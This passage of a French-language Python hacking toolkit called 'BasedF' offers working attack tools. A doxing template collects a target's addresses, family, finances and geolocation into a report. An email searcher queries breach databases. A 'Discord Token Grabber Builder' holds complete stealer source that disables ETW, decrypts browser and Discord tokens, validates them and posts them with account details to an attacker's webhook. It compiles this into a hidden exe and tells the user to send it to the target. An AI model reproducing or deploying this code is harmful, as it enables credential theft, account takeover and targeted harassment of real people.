            if phonenumbers.is_valid_number(parsed):
                return {
                    "country": geocoder.description_for_number(parsed, "fr") or "None",
                    "carrier": carrier.name_for_number(parsed, "fr") or "None",
                    "timezone": ", ".join(tz.time_zones_for_number(parsed)) or "None",
                    "format": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                }
        except Exception:
            pass
        return {}

    # ========================================================
    # PHASE 1 : GENERATED
    # ========================================================
    print(f"{WHITE}{BOLD}-- Generated --{RESET}")
    created_by = Ask("Created By")

    # ========================================================
    # PHASE 2 : IDENTITY
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Identity --{RESET}")
    first_name    = Ask("First Name")
    last_name     = Ask("Last Name")
    username      = Ask("Username")
    date_of_birth = Ask("Date of Birth")
    age           = Ask("Age")
    gender        = Ask("Gender")
    nationality   = Ask("Nationality")
    ethnicity     = Ask("Ethnicity")
    religion      = Ask("Religion")
    face_photo    = Ask("Face Photo Url")
    other_photos  = Ask("Other Photos Urls")

    # ========================================================
    # PHASE 3 : LOCATION
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Location --{RESET}")
    ip = Ask("Public Ip")

    geo = {}
    if ip != "None":
        print(f"{YELLOW}[*] GeoIP Lookup...{RESET}")
        geo = LookupIp(ip)
        if geo:
            print(f"{GREEN}[+] IP Localisee : {geo.get('city')}, {geo.get('country')}{RESET}")

    country      = geo.get("country", None) or Ask("Country")
    region       = geo.get("regionName", None) or Ask("Region / State")
    city         = geo.get("city", None) or Ask("City")
    zip_code     = geo.get("zip", None) or Ask("Zip Code")
    latitude     = geo.get("lat", None) or Ask("Latitude")
    longitude    = geo.get("lon", None) or Ask("Longitude")
    timezone_str = geo.get("timezone", None) or Ask("Timezone")
    isp          = geo.get("isp", None) or Ask("ISP")
    org          = geo.get("org", None) or Ask("Organization")
    asn          = geo.get("as", None) or Ask("ASN")
    hostname     = geo.get("reverse", None) or Ask("Hostname")
    is_proxy     = str(geo.get("proxy", "")) or Ask("Proxy/VPN")
    is_mobile    = str(geo.get("mobile", "")) or Ask("Mobile")
    address      = Ask("Full Address")
    home_address = Ask("Home Address")
    work_address = Ask("Work Address")
    
    coordinates = f"{latitude}, {longitude}" if latitude != "None" and longitude != "None" else "None"
    maps_url = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude != "None" and longitude != "None" else "None"

    # ========================================================
    # PHASE 4 : CONTACT
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Contact --{RESET}")
    email  = Ask("Email")
    email2 = Ask("Email 2")
    phone  = Ask("Phone Number")

    phone_info = {}
    if phone != "None":
        print(f"{YELLOW}[*] Phone Lookup...{RESET}")
        phone_info = LookupPhone(phone)
        if phone_info:
            print(f"{GREEN}[+] Operateur : {phone_info.get('carrier')} ({phone_info.get('country')}){RESET}")

    phone2        = Ask("Phone Number 2")
    phone_country = phone_info.get("country", "None")
    phone_carrier = phone_info.get("carrier", "None")
    phone_tz      = phone_info.get("timezone", "None")
    phone_format  = phone_info.get("format", phone)

    # ========================================================
    # PHASE 5 : SOCIAL MEDIA
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Social Media --{RESET}")
    discord    = Ask("Discord")
    discord_id = Ask("Discord Id")
    instagram  = Ask("Instagram")
    twitter    = Ask("Twitter / X")
    tiktok     = Ask("TikTok")
    facebook   = Ask("Facebook")
    snapchat   = Ask("Snapchat")
    telegram   = Ask("Telegram")
    youtube    = Ask("YouTube")
    twitch     = Ask("Twitch")
    github     = Ask("GitHub")
    steam      = Ask("Steam")
    steam_id   = Ask("Steam Id")
    reddit     = Ask("Reddit")
    linkedin   = Ask("LinkedIn")
    pinterest  = Ask("Pinterest")
    roblox     = Ask("Roblox")
    roblox_id  = Ask("Roblox Id")
    minecraft  = Ask("Minecraft")
    psn        = Ask("PSN")
    xbox       = Ask("Xbox")

    # ========================================================
    # PHASE 6 : DEVICE
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Device --{RESET}")
    os_info      = Ask("Operating System")
    browser_info = Ask("Browser")
    mac_address  = Ask("Mac Address")
    device_model = Ask("Device Model")
    screen_res   = Ask("Screen Resolution")
    language     = Ask("Language")
    user_agent   = Ask("User Agent")

    # ========================================================
    # PHASE 7 : FAMILY
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Family --{RESET}")
    mother        = Ask("Mother's Name")
    mother_phone  = Ask("Mother's Phone")
    father        = Ask("Father's Name")
    father_phone  = Ask("Father's Phone")
    siblings      = Ask("Siblings")
    partner       = Ask("Partner / Spouse")
    partner_phone = Ask("Partner's Phone")
    children      = Ask("Children")
    relationship  = Ask("Relationship Status")

    # ========================================================
    # PHASE 8 : WORK & EDUCATION
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Work & Education --{RESET}")
    job          = Ask("Job / Occupation")
    company      = Ask("Company")
    company_addr = Ask("Company Address")
    work_email   = Ask("Work Email")
    work_phone   = Ask("Work Phone")
    school       = Ask("School / University")
    degree       = Ask("Degree")
    student_id   = Ask("Student Id")

    # ========================================================
    # PHASE 9 : FINANCIAL
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Financial --{RESET}")
    bank          = Ask("Bank")
    crypto_wallet = Ask("Crypto Wallet")
    paypal        = Ask("PayPal")

    # ========================================================
    # PHASE 10 : NOTES
    # ========================================================
    print(f"\n{WHITE}{BOLD}-- Notes --{RESET}")
    notes  = Ask("Notes")
    source = Ask("Source / How obtained")

    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    name_tool = "BasedF"
    github_url = "https://github.com/uhqskid-coder"

    # ========================================================
    # RAPPORT DOX
    # ========================================================
    dox = f"""
⠀⣿⠲⠤⣀⡀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀⠀⠀⠀⠀⠀          ██████╗  ██████╗ ██╗  ██╗
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⣆⠀⠀⠀⠀          ██╔══██╗██╔═══██╗╚██╗██╔╝
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠋⠀⠀⠀⠀          ██║  ██║██║   ██║ ╚███╔╝
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀⠀⠀⠀⠀          ██║  ██║██║   ██║ ██╔██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⠙⢆⡀⠀⠀⠀⠀          ██████╔╝╚██████╔╝██╔╝ ██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⣿⣿⣿⣷⡀⠀⠀          ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⣿⣿⣿⠏⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢳⡀           ██████╗██████╗ ███████╗ █████╗ ████████╗ ██████╗ ██████╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢳          ██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀          ██║     ██████╔╝█████╗  ███████║   ██║   ██║   ██║██████╔╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀          ██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██║   ██║██╔══██╗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀          ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀           ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⣿⣿⣿⣿⣿⣿⣿                   by MrStrabisme
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿       
⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

╓─────────────────────────────────────╖
              Generated               
╙─────────────────────────────────────╜
 - Created At     : {created_at}
 - Created By     : {created_by}

╓─────────────────────────────────────╖
               Identity
╙─────────────────────────────────────╜
 - Full Name      : {first_name} {last_name}
 - Username       : {username}
 - Date of Birth  : {date_of_birth}
 - Age            : {age}
 - Gender         : {gender}
 - Nationality    : {nationality}
 - Ethnicity      : {ethnicity}
 - Religion       : {religion}
 - Face Photo     : {face_photo}
 - Other Photos   : {other_photos}

╓─────────────────────────────────────╖
               Location
╙─────────────────────────────────────╜
 - Public Ip      : {ip}
 - Hostname       : {hostname}
 - ISP            : {isp}
 - Organization   : {org}
 - ASN            : {asn}
 - Proxy / VPN    : {is_proxy}
 - Mobile         : {is_mobile}
 - Country        : {country}
 - Region         : {region}
 - City           : {city}
 - Zip Code       : {zip_code}
 - Address        : {address}
 - Home Address   : {home_address}
 - Work Address   : {work_address}
 - Coordinates    : {coordinates}
 - Google Maps    : {maps_url}
 - Timezone       : {timezone_str}

╓─────────────────────────────────────╖
               Contact               
╙─────────────────────────────────────╜
 - Email          : {email}
 - Email 2        : {email2}
 - Phone          : {phone_format}
 - Phone Country  : {phone_country}
 - Phone Carrier  : {phone_carrier}
 - Phone Timezone : {phone_tz}
 - Phone 2        : {phone2}

╓─────────────────────────────────────╖
             Social Media             
╙─────────────────────────────────────╜
 - Discord        : {discord}
 - Discord Id     : {discord_id}
 - Instagram      : {instagram}
 - Twitter / X    : {twitter}
 - TikTok         : {tiktok}
 - Facebook       : {facebook}
 - Snapchat       : {snapchat}
 - Telegram       : {telegram}
 - YouTube        : {youtube}
 - Twitch         : {twitch}
 - GitHub         : {github}
 - Steam          : {steam}
 - Steam Id       : {steam_id}
 - Reddit         : {reddit}
 - LinkedIn       : {linkedin}
 - Pinterest      : {pinterest}
 - Roblox         : {roblox}
 - Roblox Id      : {roblox_id}
 - Minecraft      : {minecraft}
 - PSN            : {psn}
 - Xbox           : {xbox}

╓─────────────────────────────────────╖
                Device                
╙─────────────────────────────────────╜
 - OS             : {os_info}
 - Browser        : {browser_info}
 - Mac Address    : {mac_address}
 - Device Model   : {device_model}
 - Screen Res     : {screen_res}
 - Language       : {language}
 - User Agent     : {user_agent}

╓─────────────────────────────────────╖
                Family                
╙─────────────────────────────────────╜
 - Mother         : {mother}
 - Mother Phone   : {mother_phone}
 - Father         : {father}
 - Father Phone   : {father_phone}
 - Siblings       : {siblings}
 - Partner        : {partner}
 - Partner Phone  : {partner_phone}
 - Children       : {children}
 - Relationship   : {relationship}

╓─────────────────────────────────────╖
           Work & Education            
╙─────────────────────────────────────╜
 - Job            : {job}
 - Company        : {company}
 - Company Addr   : {company_addr}
 - Work Email     : {work_email}
 - Work Phone     : {work_phone}
 - School         : {school}
 - Degree         : {degree}
 - Student Id     : {student_id}

╓─────────────────────────────────────╖
              Financial               
╙─────────────────────────────────────╜
 - Bank           : {bank}
 - Crypto Wallet  : {crypto_wallet}
 - PayPal         : {paypal}

╓─────────────────────────────────────╖
                Notes                
╙─────────────────────────────────────╜
 - Notes          : {notes}
 - Source         : {source}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────"""

    print(f"\n{YELLOW}[*] Generation du rapport...{RESET}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    name = f"{first_name}".replace(" ", "_") if first_name != "None" else "Unknown"
    filename = f"Dox_{name}_{timestamp}.txt"
    output_dir = Path(_safe_workdir()) / "Output" / "DoxCreator"
    output_path = output_dir / filename

    output_dir.mkdir(parents=True, exist_ok=True)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(dox)

    print(f"{GREEN}[+] Rapport sauvegarde : {output_path}{RESET}")

    if os.name == "nt":
        try:
            os.startfile(str(output_dir))
        except Exception:
            pass

    pause()


def option_7():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ EMAIL SEARCHER — multi-sources ]{RESET}\n")
    print(f"{GRAY}Sources : LeakCheck, XposedOrNot, Intelligence X (optionnel).{RESET}\n")

    email = input(f"{CYAN}[?] Email a rechercher -> {RESET}").strip()
    if not email or "@" not in email or "." not in email:
        print(f"{RED}[!] Email invalide.{RESET}")
        pause()
        return

    results = {"breaches": [], "sources": [], "intelx": [], "pastes": []}
    rlock = threading.Lock()

    def check_leakcheck():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(f"https://leakcheck.io/api/public?check={enc}", timeout=15)
            if r.status_code == 429:
                with rlock:
                    print(f"{YELLOW}[!] LeakCheck : rate limite{RESET}")
                return
            if r.status_code != 200:
                return
            data = r.json()
            if data.get("success") and data.get("found", 0) > 0:
                with rlock:
                    results["breaches"].append({
                        "source": "LeakCheck.io",
                        "count": data.get("found", 0),
                        "fields": data.get("fields", []),
                        "sources": data.get("sources", [])[:30],
                    })
                    print(f"{RED}[!] LeakCheck   : {data.get('found')} fuites{RESET}")
                    for f in data.get("fields", [])[:10]:
                        print(f"{GRAY}    - champ : {f}{RESET}")
        except Exception:
            pass

    def check_xposedornot():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(f"https://xposedornot.com/v1/check-email/{enc}", timeout=15)
            if r.status_code != 200:
                return
            data = r.json()
            breaches = data.get("ExposedRecords") or data.get("breaches") or []
            if breaches:
                names = []
                for b in breaches:
                    if isinstance(b, dict):
                        n = b.get("breach") or b.get("name") or b.get("Name")
                        if n:
                            names.append(n)
                    elif isinstance(b, str):
                        names.append(b)
                if names:
                    with rlock:
                        results["breaches"].append({
                            "source": "XposedOrNot",
                            "count": len(names),
                            "sources": names[:30],
                        })
                        print(f"{RED}[!] XposedOrNot : {len(names)} fuites{RESET}")
                        for n in names[:10]:
                            print(f"{GRAY}    - {n}{RESET}")
        except Exception:
            pass

    def check_hibp_public():
        try:
            enc = urllib.parse.quote(email, safe="")
            r = requests.get(
                f"https://haveibeenpwned.com/unifiedsearch/{enc}",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                    "Accept": "application/json",
                },
                timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                breaches = data.get("Breaches", [])
                pastes = data.get("Pastes", [])
                if breaches or pastes:
                    with rlock:
                        results["breaches"].append({
                            "source": "Firefox Monitor / HIBP",
                            "count": len(breaches),
                            "sources": [b.get("Name") for b in breaches if b.get("Name")][:30],
                        })
                        if pastes:
                            results["pastes"] = pastes
                        print(f"{RED}[!] Firefox Monitor : {len(breaches)} breaches, {len(pastes)} pastes{RESET}")
        except Exception:
            pass

    def check_pastebin_dorks():
        dorks = [
            f'"{email}" site:pastebin.com',
            f'"{email}" site:ghostbin.co',
            f'"{email}" site:controlc.com',
            f'"{email}" site:rentry.co',
            f'"{email}" site:hastebin.com',
        ]
        with rlock:
            results["pastes"] = dorks
            print(f"{GREEN}[+] Dorks Pastebin : {len(dorks)} recherches{RESET}")

    def check_intelx():
        config_file = Path(_safe_workdir()) / "config.json"
        api_key = ""
        api_url = "https://free.intelx.io"

        if config_file.exists():
            try:
                with open(config_file, "r", encoding="utf-8") as f:
                    cfg = json.load(f)
                api_key = cfg.get("intelx", {}).get("api_key", "").strip()
                api_url = cfg.get("intelx", {}).get("api_url", api_url).rstrip("/")
            except Exception:
                pass

        if not api_key:
            with rlock:
                print(f"{GRAY}[i] IntelX : pas de cle API configuree (skip){RESET}")
            return

        try:
            headers = {"x-key": api_key, "User-Agent": "BasedF-IntelX"}
            payload = {
                "term": email,
                "buckets": [],
                "lookuplevel": 0,
                "timeout": 60,
                "datefrom": "",
                "dateto": "",
                "sort": 4,
                "media": 0,
            }
            r = requests.post(f"{api_url}/intelligent/search", headers=headers, json=payload, timeout=30)
            if r.status_code == 401:
                with rlock:
                    print(f"{RED}[!] IntelX : cle API invalide{RESET}")
                return
            if r.status_code >= 400:
                return
            data = r.json()
            records = data.get("records", [])
            with rlock:
                if records:
                    results["intelx"] = records
                    print(f"{GREEN}[+] IntelX : {len(records)} resultats{RESET}")
                else:
                    print(f"{GRAY}[i] IntelX : aucun resultat{RESET}")
        except Exception:
            pass

    print(f"{YELLOW}[*] Interrogation des sources...{RESET}\n")

    threads = [
        threading.Thread(target=check_leakcheck, daemon=True),
        threading.Thread(target=check_xposedornot, daemon=True),
        threading.Thread(target=check_hibp_public, daemon=True),
        threading.Thread(target=check_pastebin_dorks, daemon=True),
        threading.Thread(target=check_intelx, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"\n{CYAN}   RESUME{RESET}")
    total_breaches = sum(b.get("count", 0) for b in results["breaches"])
    print(f"{GREEN}[+] Breaches trouvees  : {total_breaches}{RESET}")
    print(f"{GREEN}[+] Sources breach     : {len(results['breaches'])}{RESET}")
    print(f"{GREEN}[+] IntelX             : {len(results['intelx'])}{RESET}")
    print(f"{GREEN}[+] Paste dorks        : {len(results['pastes'])}{RESET}")

    if results["breaches"]:
        print(f"\n{CYAN}--- DETAIL BREACHES ---{RESET}")
        for b in results["breaches"]:
            print(f"\n{GREEN}[{b['source']}]{RESET} — {b.get('count', 0)} fuites")
            for s in b.get("sources", [])[:20]:
                print(f"{GRAY}  - {s}{RESET}")
            for f in b.get("fields", [])[:10]:
                print(f"{YELLOW}  [champ expose] {f}{RESET}")

    if results["intelx"]:
        print(f"\n{CYAN}--- DETAIL INTELX ---{RESET}")
        for i, rec in enumerate(results["intelx"][:20], 1):
            print(f"{CYAN}[{i}]{RESET} {WHITE}{rec.get('name', 'N/A')}{RESET}")
            print(f"    ID     : {rec.get('storageid', 'N/A')}")
            print(f"    Bucket : {rec.get('bucket', 'N/A')}")
            print(f"    Date   : {rec.get('date', 'N/A')}")

    if results["pastes"]:
        print(f"\n{CYAN}--- PASTE DORKS ---{RESET}")
        for d in results["pastes"]:
            print(f"{GRAY}  {d}{RESET}")
            print(f"{GRAY}  https://www.google.com/search?q={urllib.parse.quote(d)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "EmailSearch"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^\w\-]", "_", email)[:60]
        out_file = out_dir / f"report_{safe}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write(f"Email: {email}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            f.write("[BREACHES]\n")
            total = 0
            for b in results["breaches"]:
                f.write(f"\n  Source: {b['source']}  ({b.get('count', 0)} fuites)\n")
                total += b.get("count", 0)
                for s in b.get("sources", []):
                    f.write(f"    - {s}\n")
                for fl in b.get("fields", []):
                    f.write(f"    [champ] {fl}\n")
            f.write(f"\n  TOTAL: {total} entrees\n")

            if results["intelx"]:
                f.write("\n[INTELX]\n")
                for i, rec in enumerate(results["intelx"], 1):
                    f.write(f"  [{i}] {rec.get('name', 'N/A')}\n")
                    f.write(f"      ID: {rec.get('storageid', 'N/A')}\n")
                    f.write(f"      Date: {rec.get('date', 'N/A')}\n")

            if results["pastes"]:
                f.write("\n[PASTE DORKS]\n")
                for d in results["pastes"]:
                    f.write(f"  {d}\n")
                    f.write(f"    https://www.google.com/search?q={urllib.parse.quote(d)}\n")

        print(f"\n{GREEN}[+] Rapport sauvegarde : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    if os.name == "nt":
        try:
            os.startfile(str(Path(_safe_workdir()) / "Output" / "EmailSearch"))
        except Exception:
            pass
    pause()


def option_8():
    clear()
    banner()

    print(f"\n{CYAN}   [ DISCORD TOKEN GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    source = r'''import os, re, sys, json, base64, ctypes, sqlite3, subprocess, requests

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

for _p in ["requests", "pycryptodome", "pywin32"]:
    try:
        __import__({"pycryptodome": "Crypto", "pywin32": "win32crypt"}.get(_p, _p))
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", _p],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception:
            pass

import requests, win32crypt
from Crypto.Cipher import AES

WEBHOOK = "__WEBHOOK_URL__"
APPDATA = os.getenv("APPDATA", "")
LOCAL = os.getenv("LOCALAPPDATA", "")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

ROOTS = [
    ("Discord", os.path.join(APPDATA, "discord")),
    ("Discord Canary", os.path.join(APPDATA, "discordcanary")),
    ("Discord PTB", os.path.join(APPDATA, "discordptb")),
    ("Chrome", os.path.join(LOCAL, "Google", "Chrome", "User Data")),
    ("Chrome Beta", os.path.join(LOCAL, "Google", "Chrome Beta", "User Data")),
    ("Edge", os.path.join(LOCAL, "Microsoft", "Edge", "User Data")),
    ("Brave", os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data")),
    ("Opera", os.path.join(APPDATA, "Opera Software", "Opera Stable")),
    ("Opera GX", os.path.join(APPDATA, "Opera Software", "Opera GX Stable")),
    ("Vivaldi", os.path.join(LOCAL, "Vivaldi", "User Data")),
    ("Yandex", os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data")),
]

def get_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            ls = json.load(f)
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt(enc, key):
    try:
        raw = base64.b64decode(enc.split("dQw4w9WgXcQ:")[1])
        iv, payload = raw[3:15], raw[15:-16]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload).decode("utf-8", errors="ignore")
    except Exception:
        return None

def profiles(root):
    if not os.path.isdir(root):
        return []
    if os.path.isdir(os.path.join(root, "Local Storage", "leveldb")):
        return [root]
    out = []
    d = os.path.join(root, "Default")
    if os.path.isdir(os.path.join(d, "Local Storage", "leveldb")):
        out.append(d)
    try:
        for x in sorted(os.listdir(root)):
            p = os.path.join(root, x)
            if x.startswith("Profile ") and os.path.isdir(os.path.join(p, "Local Storage", "leveldb")):
                out.append(p)
    except Exception:
        pass
    return out

TOKEN_RE = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|dQw4w9WgXcQ:[^\"]*")

def extract(profile):
    ldb = os.path.join(profile, "Local Storage", "leveldb")
    found = set()
    if not os.path.isdir(ldb):
        return found
    try:
        for f in os.listdir(ldb):
            if not f.endswith((".ldb", ".log")):
                continue
            try:
                with open(os.path.join(ldb, f), "r", errors="ignore") as fh:
                    for line in fh:
                        for m in TOKEN_RE.findall(line):
                            found.add(m)
            except Exception:
                continue
    except Exception:
        pass
    return found

def normalize_token(tok, key):
    if tok.startswith("dQw4w9WgXcQ:"):
        return decrypt(tok, key)
    return tok

def valid(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me",
                     headers={"Authorization": tok}, timeout=8)
        return r.status_code == 200
    except Exception:
        return False

def get_info(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me",
                     headers={"Authorization": tok}, timeout=8)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def get_billing(tok):
    try:
        r = HTTP.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                     headers={"Authorization": tok}, timeout=8)
        if r.status_code == 200:
            subs = r.json()
            return len(subs) > 0
    except Exception:
        pass
    return False

NITRO_MAP = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}

def build_embed(src, tok, inf, has_nitro):
    nitro_type = NITRO_MAP.get(inf.get("premium_type", 0), "None")
    if has_nitro and nitro_type == "None":
        nitro_type = "Nitro (billing)"

    username = inf.get("username", "N/A")
    discriminator = inf.get("discriminator", "0")
    display = f"{username}#{discriminator}" if discriminator != "0" else f"@{username}"

    avatar_hash = inf.get("avatar")
    user_id = inf.get("id", "N/A")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else ""

    return {
        "title": f"Token captured — {src}",
        "color": 0xFFFFFF,
        "thumbnail": {"url": avatar_url} if avatar_url else {},
        "fields": [
            {"name": "Token", "value": f"```{tok}```", "inline": False},
            {"name": "Username", "value": display, "inline": True},
            {"name": "User ID", "value": user_id, "inline": True},
            {"name": "Email", "value": inf.get("email") or "N/A", "inline": True},
            {"name": "Email verified", "value": "Yes" if inf.get("verified") else "No", "inline": True},
            {"name": "Phone", "value": inf.get("phone") or "N/A", "inline": True},
            {"name": "MFA", "value": "Enabled" if inf.get("mfa_enabled") else "Disabled", "inline": True},
            {"name": "Nitro", "value": nitro_type, "inline": True},
            {"name": "Locale", "value": inf.get("locale", "N/A"), "inline": True},
        ],
        "footer": {"text": f"Source: {src}"},
    }

def send_embed(embed):
    try:
        HTTP.post(WEBHOOK, json={"embeds": [embed]}, timeout=15)
    except Exception:
        pass

def main():
    seen = set()
    captured = 0
    for name, root in ROOTS:
        if not os.path.isdir(root):
            continue
        key = get_key(root)
        if not key:
            continue
        for prof in profiles(root):
            tag = name if prof == root or os.path.basename(prof) == "Default" \
                  else f"{name} / {os.path.basename(prof)}"
            for raw in extract(prof):
                tok = normalize_token(raw, key)
                if not tok or tok in seen:
                    continue
                if not valid(tok):
                    continue
                inf = get_info(tok)
                if not inf:
                    continue
                seen.add(tok)
                has_nitro = get_billing(tok)
                send_embed(build_embed(tag, tok, inf, has_nitro))
                captured += 1
    if captured:
        try:
            HTTP.post(WEBHOOK, json={
                "content": f"**{captured} token(s) capturé(s)**"
            }, timeout=10)
        except Exception:
            pass

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = source.replace("__WEBHOOK_URL__", webhook)
    tmp = _safe_tmp("_grabber_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_grabber")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "grabber",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=win32crypt",
        "--hidden-import=Crypto.Cipher",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "grabber.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie grabber.exe a la cible.{RESET}")

    for p in [tmp, os.path.join(spec_dir, "grabber.spec"), work_dir]:
        try:
            if os.path.isdir(p):
